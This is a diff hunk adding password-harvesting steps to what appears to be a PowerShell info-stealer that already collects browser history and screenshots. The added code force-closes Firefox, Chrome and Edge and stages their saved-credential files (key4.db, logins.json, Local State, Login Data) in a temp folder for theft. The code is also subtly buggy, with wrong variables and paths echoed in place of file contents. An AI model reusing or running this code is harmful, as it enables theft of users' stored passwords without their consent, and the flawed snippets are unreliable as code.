@@ -572,6 +572,39 @@ Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
+
+# Get FireFox Passwords
+taskkill /IM firefox.exe /F
+sleep 1
+New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
+$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+echo $key4 > $env:TMP\$FolderName\Firefox\key4.db
+$logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+echo $key4 > $env:TMP\$FolderName\Firefox\logins.json
+
+# Get Chrome Passwords
+taskkill /IM chrome.exe /F
+sleep 1
+New-Item -Path $env:tmp/$FolderName/Chrome -ItemType Directory
+$localstate = "$env:appdata\..\local\Google\Chrome\User Data\Local State"
+$logindata = "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data"
+$preferences = "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
+Copy-Item $localstate "$env:TMP\$FolderName\Chrome\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\Chrome\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\Chrome\Preferences"
+
+
+# Get Edge Passwords
+taskkill /IM msedge.exe /F
+sleep 1
+New-Item -Path $env:tmp/$FolderName/Edge -ItemType Directory
+$localstate = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State"
+$logindata = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data"
+$preferences = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
+Copy-Item $localstate "$env:TMP\$FolderName\Edge\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\Edge\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\Edge\Preferences"
+
 ############################################################################################################################################################
 
 # Get Screenshot
